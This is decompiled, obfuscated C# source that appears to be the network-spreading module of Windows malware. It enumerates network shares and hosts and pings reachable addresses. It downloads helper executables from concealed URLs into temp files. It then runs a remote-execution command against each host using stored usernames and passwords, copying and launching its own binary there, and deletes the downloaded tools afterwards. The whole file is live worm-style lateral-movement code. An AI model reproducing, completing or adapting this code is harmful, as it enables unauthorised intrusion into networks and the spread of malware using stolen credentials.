using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class DLNInMwPrHTI
{
	public enum HjHfGfuedGgt
	{
		MWoXvQkgkbZGE = 1,
		XMyagMAkzU,
		aALezEpckNsZMuR,
		VqiNzzRosl,
		IGkQCerMjiiqt
	}

	public enum wPOIfYjjdX
	{
		KXauamBoICK,
		CsbZubXZUkBb,
		MzorZMIsgGGbQ,
		QxaJVvswqKg
	}

	public enum NyPHLTyiWybvzs
	{
		PPyPqggCNaJcuf = 1,
		OfCUkFXrKWyo = 2,
		OeRbFTpGfyecY = 4,
		SDiRLczqrVxKf = 8,
		GvQkCRKySLi = 16,
		lPYmWWQLQEye = 19
	}

	public enum epTWuZTaWycYz
	{
		gyxmBLUGulJQB,
		YPJYuCGekthPbG,
		kwYJssxwCgw,
		ZxdxJIitigVKuFu,
		OlTrTVOLkxEeqmTLjM,
		DNIgboGAzCv,
		SMNtFykeeVbbm,
		BrlRSwrnwLhMlT,
		CoAPSMpfbpByGI,
		owZbQfPVYMKUQm,
		wmnZSWompyG,
		IxsEhkUpFXJVN
	}

	public sealed class CTWWGHAwiHnvS : IEnumerable
	{
		private enum ceZNXamTYPEjTaP
		{
			kXMxhigbUVucSd = 0,
			QkuHRIzRBj = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class wenwMqLLHKy
		{
			public HjHfGfuedGgt JaVARBXJXLS;

			public wPOIfYjjdX hDKFVTtppWCMax;

			public epTWuZTaWycYz bWvizBOvtONE;

			public NyPHLTyiWybvzs LqhNBuBsqsaOp;

			public string SbJPjVFyEftOZ;

			public string ZVrylAAtVST;

			public string uVCAXDMPCFaqL;

			public string DowepaBMHn;
		}

		private ArrayList kxDVhgkLbbi = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern ceZNXamTYPEjTaP WNetOpenEnumA(HjHfGfuedGgt dwScope, wPOIfYjjdX dwType, NyPHLTyiWybvzs dwUsage, wenwMqLLHKy p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern ceZNXamTYPEjTaP WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern ceZNXamTYPEjTaP WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(wenwMqLLHKy wenwMqLLHKy_0, HjHfGfuedGgt hjHfGfuedGgt_0, wPOIfYjjdX wPOIfYjjdX_0, NyPHLTyiWybvzs nyPHLTyiWybvzs_0, epTWuZTaWycYz epTWuZTaWycYz_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(hjHfGfuedGgt_0, wPOIfYjjdX_0, nyPHLTyiWybvzs_0, wenwMqLLHKy_0, out lphEnum) == ceZNXamTYPEjTaP.kXMxhigbUVucSd)
			{
				ceZNXamTYPEjTaP ceZNXamTYPEjTaP;
				do
				{
					ceZNXamTYPEjTaP = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (ceZNXamTYPEjTaP)
					{
					case ceZNXamTYPEjTaP.QkuHRIzRBj:
						continue;
					case ceZNXamTYPEjTaP.kXMxhigbUVucSd:
						Marshal.PtrToStructure(intPtr, wenwMqLLHKy_0);
						if (wenwMqLLHKy_0.bWvizBOvtONE == epTWuZTaWycYz_0)
						{
							kxDVhgkLbbi.Add(wenwMqLLHKy_0.ZVrylAAtVST);
						}
						if ((wenwMqLLHKy_0.LqhNBuBsqsaOp & NyPHLTyiWybvzs.OfCUkFXrKWyo) == NyPHLTyiWybvzs.OfCUkFXrKWyo)
						{
							EnumerateServers(wenwMqLLHKy_0, hjHfGfuedGgt_0, wPOIfYjjdX_0, nyPHLTyiWybvzs_0, epTWuZTaWycYz_0);
						}
						continue;
					}
					break;
				}
				while (ceZNXamTYPEjTaP != ceZNXamTYPEjTaP.QkuHRIzRBj);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public CTWWGHAwiHnvS(HjHfGfuedGgt hjHfGfuedGgt_0, wPOIfYjjdX wPOIfYjjdX_0, NyPHLTyiWybvzs nyPHLTyiWybvzs_0, epTWuZTaWycYz epTWuZTaWycYz_0)
		{
			wenwMqLLHKy wenwMqLLHKy_ = new wenwMqLLHKy();
			EnumerateServers(wenwMqLLHKy_, hjHfGfuedGgt_0, wPOIfYjjdX_0, nyPHLTyiWybvzs_0, epTWuZTaWycYz_0);
		}

		public IEnumerator GetEnumerator()
		{
			return kxDVhgkLbbi.GetEnumerator();
		}
	}

	private sealed class EAyXkDidvx
	{
		public string UfYMkhDQjE;

		public string FTRyuZktIdh;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107398271)) && !string_0.StartsWith(getString_0(107398234)) && !string_0.StartsWith(getString_0(107398225)) && !string_0.Contains(getString_0(107401647))) || !YuPQEPIQgrKeMjD(string_0))
			{
				return;
			}
			if (OwCGWssNrah.pzIDJESPERYAQ == getString_0(107396943))
			{
				for (int i = 0; i < hJIBgfMRetiYwi.Count; i++)
				{
					if (OwCGWssNrah.wDQibieeLNEkihtFqY)
					{
						if (File.Exists(UfYMkhDQjE))
						{
							OwCGWssNrah.pjARRmeFiHBjb(UfYMkhDQjE, getString_0(107400457) + string_0 + getString_0(107348568) + hJIBgfMRetiYwi[i] + getString_0(107348559) + xQpBpSvhmUfEhveC[i] + getString_0(107348582) + Assembly.GetEntryAssembly()!.Location + getString_0(107400411));
						}
					}
					else if (File.Exists(FTRyuZktIdh))
					{
						OwCGWssNrah.pjARRmeFiHBjb(FTRyuZktIdh, getString_0(107400457) + string_0 + getString_0(107348568) + hJIBgfMRetiYwi[i] + getString_0(107348559) + xQpBpSvhmUfEhveC[i] + getString_0(107348549) + Assembly.GetEntryAssembly()!.Location + getString_0(107400411));
					}
				}
			}
			else if (OwCGWssNrah.wDQibieeLNEkihtFqY)
			{
				if (File.Exists(UfYMkhDQjE))
				{
					OwCGWssNrah.pjARRmeFiHBjb(UfYMkhDQjE, getString_0(107400457) + string_0 + getString_0(107348492) + Assembly.GetEntryAssembly()!.Location + getString_0(107400411));
				}
			}
			else if (File.Exists(FTRyuZktIdh))
			{
				OwCGWssNrah.pjARRmeFiHBjb(FTRyuZktIdh, getString_0(107400457) + string_0 + getString_0(107348459) + Assembly.GetEntryAssembly()!.Location + getString_0(107400411));
			}
		}

		static EAyXkDidvx()
		{
			Strings.CreateGetStringDelegate(typeof(EAyXkDidvx));
		}
	}

	public static List<string> JxfHumEdpt;

	public static string WlrnidOlclmGw;

	public static List<string> hJIBgfMRetiYwi;

	public static List<string> xQpBpSvhmUfEhveC;

	public static List<string> NnhoUIoGUlQ;

	public List<string> qTDhOasxRjZY = new List<string>();

	public List<string> IcRqapuYnUfn = new List<string>();

	public List<string> HaJNXxudWzneh = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void YfjUtuFLQuPzz()
	{
		EAyXkDidvx CS_0024_003C_003E8__locals0 = new EAyXkDidvx();
		OwCGWssNrah.BwkTFAHCCQxII();
		List<WnOnbNfZRZz> list = WnOnbNfZRZz.lUwFzvFBvPLOcVh();
		foreach (WnOnbNfZRZz item in list)
		{
			JxfHumEdpt.Add(item.IPAddress);
		}
		if (OwCGWssNrah.pwLkvVGaTZr.Count > 0)
		{
			JxfHumEdpt = JxfHumEdpt.Union(OwCGWssNrah.pwLkvVGaTZr).ToList();
		}
		CS_0024_003C_003E8__locals0.UfYMkhDQjE = getString_0(107401601);
		CS_0024_003C_003E8__locals0.FTRyuZktIdh = getString_0(107401601);
		try
		{
			CS_0024_003C_003E8__locals0.UfYMkhDQjE = GuFdEdSaTMtU();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.FTRyuZktIdh = lmvAjEIlWfS();
		}
		catch
		{
		}
		foreach (WnOnbNfZRZz item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107398225)) || item2.IPAddress.StartsWith(getString_0(107398188)) || item2.IPAddress.StartsWith(getString_0(107398179)) || item2.IPAddress.Contains(getString_0(107401601)))
				{
					GaKHPYMpLi.guEFzaWzxhCIkL(item2.MacAddress, item2.IPAddress, getString_0(107348308));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(JxfHumEdpt, delegate(string string_0)
			{
				if ((string_0.StartsWith(EAyXkDidvx.getString_0(107398271)) || string_0.StartsWith(EAyXkDidvx.getString_0(107398234)) || string_0.StartsWith(EAyXkDidvx.getString_0(107398225)) || string_0.Contains(EAyXkDidvx.getString_0(107401647))) && YuPQEPIQgrKeMjD(string_0))
				{
					if (OwCGWssNrah.pzIDJESPERYAQ == EAyXkDidvx.getString_0(107396943))
					{
						for (int i = 0; i < hJIBgfMRetiYwi.Count; i++)
						{
							if (OwCGWssNrah.wDQibieeLNEkihtFqY)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.UfYMkhDQjE))
								{
									OwCGWssNrah.pjARRmeFiHBjb(CS_0024_003C_003E8__locals0.UfYMkhDQjE, EAyXkDidvx.getString_0(107400457) + string_0 + EAyXkDidvx.getString_0(107348568) + hJIBgfMRetiYwi[i] + EAyXkDidvx.getString_0(107348559) + xQpBpSvhmUfEhveC[i] + EAyXkDidvx.getString_0(107348582) + Assembly.GetEntryAssembly()!.Location + EAyXkDidvx.getString_0(107400411));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.FTRyuZktIdh))
							{
								OwCGWssNrah.pjARRmeFiHBjb(CS_0024_003C_003E8__locals0.FTRyuZktIdh, EAyXkDidvx.getString_0(107400457) + string_0 + EAyXkDidvx.getString_0(107348568) + hJIBgfMRetiYwi[i] + EAyXkDidvx.getString_0(107348559) + xQpBpSvhmUfEhveC[i] + EAyXkDidvx.getString_0(107348549) + Assembly.GetEntryAssembly()!.Location + EAyXkDidvx.getString_0(107400411));
							}
						}
					}
					else if (OwCGWssNrah.wDQibieeLNEkihtFqY)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.UfYMkhDQjE))
						{
							OwCGWssNrah.pjARRmeFiHBjb(CS_0024_003C_003E8__locals0.UfYMkhDQjE, EAyXkDidvx.getString_0(107400457) + string_0 + EAyXkDidvx.getString_0(107348492) + Assembly.GetEntryAssembly()!.Location + EAyXkDidvx.getString_0(107400411));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.FTRyuZktIdh))
					{
						OwCGWssNrah.pjARRmeFiHBjb(CS_0024_003C_003E8__locals0.FTRyuZktIdh, EAyXkDidvx.getString_0(107400457) + string_0 + EAyXkDidvx.getString_0(107348459) + Assembly.GetEntryAssembly()!.Location + EAyXkDidvx.getString_0(107400411));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.UfYMkhDQjE))
			{
				File.Delete(CS_0024_003C_003E8__locals0.UfYMkhDQjE);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.FTRyuZktIdh))
			{
				File.Delete(CS_0024_003C_003E8__locals0.FTRyuZktIdh);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string GuFdEdSaTMtU()
	{
		if (IntPtr.Size == 8)
		{
			return zDYpLJQYOqVEluoP(new Uri(OwCGWssNrah.iBDvjzxzEcC(getString_0(107348287))));
		}
		return zDYpLJQYOqVEluoP(new Uri(OwCGWssNrah.iBDvjzxzEcC(getString_0(107348287))));
	}

	public static string lmvAjEIlWfS()
	{
		if (IntPtr.Size == 8)
		{
			return zDYpLJQYOqVEluoP(new Uri(OwCGWssNrah.iBDvjzxzEcC(getString_0(107348174))));
		}
		return zDYpLJQYOqVEluoP(new Uri(OwCGWssNrah.iBDvjzxzEcC(getString_0(107348609))));
	}

	public static bool YuPQEPIQgrKeMjD(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string zDYpLJQYOqVEluoP(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107348568), getString_0(107401601)).Remove(0, 3) + getString_0(107348563);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static DLNInMwPrHTI()
	{
		Strings.CreateGetStringDelegate(typeof(DLNInMwPrHTI));
		JxfHumEdpt = new List<string>();
		WlrnidOlclmGw = getString_0(107401601);
		hJIBgfMRetiYwi = new List<string>();
		xQpBpSvhmUfEhveC = new List<string>();
		NnhoUIoGUlQ = new List<string>();
	}
}
